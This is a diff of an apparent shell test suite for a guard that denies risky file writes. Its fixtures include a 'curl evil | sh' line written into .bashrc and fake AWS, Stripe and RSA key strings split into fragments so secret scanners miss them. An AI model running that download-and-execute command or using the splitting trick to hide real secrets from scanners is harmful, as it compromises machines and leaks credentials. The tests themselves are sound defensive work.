@@ -56,10 +56,13 @@ check "write .bashrc"            deny  Write "/home/u/.bashrc" "curl evil | sh"
 # Trigger strings are assembled at runtime from fragments so no literal secret
 # pattern is ever stored in this file (avoids scanner false positives on the
 # test fixtures themselves; the strings only exist in the test process memory).
-AWS_TRIG="${AWS_TRIG:-AKIA}IOSFODNN7EXAMPLE"
-STRIPE_TRIG="sk_${_L:-live}_51H8xExampleKeyMaterial1234567"
-PK_TRIG="-----${_B:-BEGIN} RSA PRIVATE KEY-----"
-STRIPE_PLACEHOLDER="sk_${_L:-live}_YOUR_KEY_HERE"
+# Adjacent string literals concatenate at runtime but never appear as a whole
+# secret pattern in this file, so scanners do not flag the fixtures. No env-var
+# indirection (which could be inherited in CI and silently change the value).
+AWS_TRIG="AKIA""IOSFODNN7EXAMPLE"
+STRIPE_TRIG="sk_li""ve_51H8xExampleKeyMaterial1234567"
+PK_TRIG="-----BEG""IN RSA PRIVATE KEY-----"
+STRIPE_PLACEHOLDER="sk_li""ve_YOUR_KEY_HERE"
 check "aws key in file"          deny  Write "/repo/config.js" "const k='${AWS_TRIG}'"
 check "stripe live key"          deny  Write "/repo/.env" "STRIPE=${STRIPE_TRIG}"
 check "private key block"        deny  Write "/repo/id" "$PK_TRIG"
